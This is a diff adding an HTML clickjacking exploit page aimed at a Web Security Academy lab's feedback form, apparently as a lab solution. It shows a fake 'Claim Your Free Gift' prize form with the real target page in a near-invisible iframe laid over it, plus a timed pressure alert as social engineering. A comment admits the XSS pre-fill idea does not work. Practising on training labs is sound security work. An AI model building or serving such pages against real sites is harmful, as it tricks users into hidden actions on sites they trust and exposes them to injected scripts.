@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win a Prize!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .container {
+            position: relative;
+            width: 100%;
+            height: 700px;
+            margin: 0 auto;
+        }
+        
+        .decoy-content {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            text-align: center;
+            padding-top: 100px;
+        }
+        
+        .decoy-content h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        
+        .fake-form {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        
+        .fake-input {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .fake-button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        
+        .fake-button:hover {
+            background-color: #45a049;
+        }
+        
+        #vulnerable-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 700px;
+            opacity: 0.0001;
+            z-index: 2;
+            border: none;
+        }
+        
+        /* Position the decoy button exactly over the submit button */
+        .button-overlay {
+            position: absolute;
+            z-index: 3;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="decoy-content">
+            <h1>🎉 Claim Your Free Gift! 🎉</h1>
+            <div class="fake-form">
+                <p>Enter your details to win an iPhone 15 Pro!</p>
+                <input type="text" class="fake-input" placeholder="Your Name" value="Test User" disabled>
+                <input type="email" class="fake-input" placeholder="Your Email" value="user@example.com" disabled>
+                <input type="text" class="fake-input" placeholder="Subject" value="Prize Claim" disabled>
+                <textarea class="fake-input" placeholder="Tell us why you deserve to win!" disabled style="height: 150px;">I would love to win this amazing prize!</textarea>
+                <button class="fake-button">Click Here to Claim!</button>
+            </div>
+        </div>
+        
+        <iframe id="vulnerable-iframe" 
+                src="https://0a3900c304b67111838b512800a90077.web-security-academy.net/feedback">
+        </iframe>
+    </div>
+    
+    <script>
+        // Pre-fill the form with XSS payload when iframe loads
+        document.getElementById('vulnerable-iframe').onload = function() {
+            // This won't work due to same-origin policy, but the idea is to 
+            // position the iframe so the user fills in the XSS payload themselves
+            console.log('Iframe loaded - user needs to submit the form');
+        };
+        
+        // Optional: Add some social engineering
+        setTimeout(function() {
+            alert('Hurry! Only 2 prizes left! Click the button to claim yours!');
+        }, 3000);
+    </script>
+</body>
+</html>
